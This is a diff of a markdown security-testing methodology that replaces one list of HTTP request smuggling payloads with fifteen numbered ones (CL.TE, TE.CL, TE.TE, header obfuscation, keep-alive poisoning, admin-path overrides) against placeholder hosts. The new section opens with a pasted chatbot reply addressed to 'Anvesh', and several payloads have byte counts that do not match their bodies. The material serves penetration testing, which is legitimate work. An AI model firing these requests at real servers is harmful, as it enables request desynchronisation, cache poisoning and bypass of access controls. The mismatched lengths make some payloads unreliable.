@@ -4458,181 +4458,235 @@ if (preg_match($pattern, $subject)) {
 
 > HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.
 
-## 🔬 HTTP Request Smuggling Sample Payloads
+Absolutely, Anvesh! Here's a **complete and actionable HTTP Request Smuggling test case list** with sample payloads, aligned with your GitHub methodology and designed for direct use in manual testing, Burp Suite, or Smuggler automation.
 
-- **CL.TE (Content-Length vs Transfer-Encoding)**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Content-Length: 13
-  Transfer-Encoding: chunked
+---
 
-  0
+## 🧪 HTTP Request Smuggling Test Cases with Payloads
 
-  GET /malicious HTTP/1.1
-  Host: target.com
-  ```
+---
 
-- **TE.CL (Transfer-Encoding vs Content-Length)**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Transfer-Encoding: chunked
-  Content-Length: 6
+### **1. CL.TE (Content-Length vs Transfer-Encoding)**
+- Front-end honors `Content-Length`, back-end honors `Transfer-Encoding`.
 
-  5
-  GPOST /evil HTTP/1.1
-  Host: target.com
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 13
+Transfer-Encoding: chunked
 
-  0
-  ```
+0
 
-- **TE.TE (Dual Transfer-Encoding headers)**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Transfer-Encoding: chunked
-  Transfer-Encoding : chunked
+GET /malicious HTTP/1.1
+Host: vulnerable.com
+```
 
-  0
+---
 
-  GET /next HTTP/1.1
-  Host: target.com
-  ```
+### **2. TE.CL (Transfer-Encoding vs Content-Length)**
+- Front-end honors `Transfer-Encoding`, back-end honors `Content-Length`.
 
-- **CL.CL (Dual Content-Length headers)**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Content-Length: 10
-  Content-Length: 4
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: chunked
+Content-Length: 6
 
-  GET /hidden HTTP/1.1
-  ```
+5
+GPOST /evil HTTP/1.1
+Host: vulnerable.com
 
-- **CL.0 (Zero Content-Length)**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Content-Length: 0
+0
+```
 
-  GET /inject HTTP/1.1
-  Host: target.com
-  ```
+---
 
-- **TE.0 (Zero chunk size)**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Transfer-Encoding: chunked
+### **3. TE.TE (Dual Transfer-Encoding headers)**
+- Conflicting `Transfer-Encoding` headers cause ambiguity.
 
-  0
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
 
-  GET /afterchunk HTTP/1.1
-  Host: target.com
-  ```
+0
 
-- **Mixed Case Headers**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  transfer-encoding: chunked
+GET /next HTTP/1.1
+Host: vulnerable.com
+```
 
-  0
+---
 
-  GET /casebypass HTTP/1.1
-  Host: target.com
-  ```
+### **4. CL.CL (Dual Content-Length headers)**
+- Desync via conflicting `Content-Length` values.
 
-- **Space/Tab Injection**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Transfer-Encoding : chunked
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 10
+Content-Length: 4
 
-  0
+GET /hidden HTTP/1.1
+```
 
-  GET /spaceinject HTTP/1.1
-  Host: target.com
-  ```
+---
 
-- **Line Ending Abuse**  
-  ```http
-  POST / HTTP/1.1\r\n
-  Host: target.com\r\n
-  Transfer-Encoding: chunked\r
-  \n
-  0\r\n
-  GET /newline HTTP/1.1\r\n
-  Host: target.com\r\n
-  ```
+### **5. CL.0 (Zero-Length Content Body)**
 
-- **Chunk Size Manipulation**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Transfer-Encoding: chunked
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 0
 
-  3
-  GET
-  0
+GET /inject HTTP/1.1
+Host: vulnerable.com
+```
 
-  GET /chunkinject HTTP/1.1
-  Host: target.com
-  ```
+---
 
-- **Keep-Alive Poisoning**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Connection: keep-alive
-  Content-Length: 13
+### **6. TE.0 (Zero chunk with extra body)**
 
-  GET /poison HTTP/1.1
-  Host: target.com
-  ```
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: chunked
 
-- **Front-End Timeout**  
-  *(Send first part, delay second)*  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Content-Length: 20
+0
 
-  GET /timeout HTTP/1.1
-  Host: target.com
-  ```
+GET /afterchunk HTTP/1.1
+Host: vulnerable.com
+```
 
-- **Header Injection**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Content-Length: 50
+---
 
-  GET / HTTP/1.1
-  Host: target.com
-  X-Forwarded-For: evil.com
-  ```
+### **7. Mixed Case Header Bypass**
 
-- **Method Override**  
-  ```http
-  GET / HTTP/1.1
-  Host: target.com
-  Content-Length: 15
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+transfer-encoding: chunked
 
-  POST /admin HTTP/1.1
-  Host: target.com
-  ```
+0
 
-- **Path Override**  
-  ```http
-  POST / HTTP/1.1
-  Host: target.com
-  Content-Length: 20
+GET /casebypass HTTP/1.1
+Host: vulnerable.com
+```
 
-  GET /admin HTTP/1.1
-  Host: target.com
-  ```
+---
+
+### **8. Space/Tab Injection in Header**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding : chunked
+
+0
+
+GET /spaceinject HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **9. Line Ending Abuse (`\r\n`, `\r`, `\n`)**
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable.com\r\n
+Transfer-Encoding: chunked\r
+\n
+0\r\n
+GET /newline HTTP/1.1\r\n
+Host: vulnerable.com\r\n
+```
+
+---
+
+### **10. Chunk Size Manipulation**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: chunked
+
+3
+GET
+0
+
+GET /chunkinject HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **11. Keep-Alive Poisoning**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Connection: keep-alive
+Content-Length: 13
+
+GET /poison HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **12. Front-End Timeout Delay**
+- Send partial request, delay second part.
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 20
+
+GET /timeout HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **13. Header Injection Smuggling**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 50
+
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-For: evil.com
+```
+
+---
+
+### **14. Method Override Smuggling**
+
+```http
+GET / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 15
+
+POST /admin HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **15. Path Override Smuggling**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 20
+
+GET /admin HTTP/1.1
+Host: vulnerable.com
+```
+
 ## Summary
 
 * [Tools](#tools)
